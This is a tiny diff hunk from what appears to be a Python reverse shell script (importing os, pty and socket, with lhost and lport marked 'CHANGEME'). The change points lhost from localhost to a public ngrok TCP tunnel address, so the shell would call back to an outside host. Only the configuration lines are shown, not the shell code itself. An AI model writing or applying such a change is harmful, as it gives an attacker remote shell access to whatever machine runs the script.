@@ -14,7 +14,7 @@ import os
 import pty
 import socket
 
-lhost = "127.0.0.1" # XXX: CHANGEME
+lhost = "tcp://2.tcp.ngrok.io:18728" # XXX: CHANGEME
 lport = 31337 # XXX: CHANGEME
 
 def main():
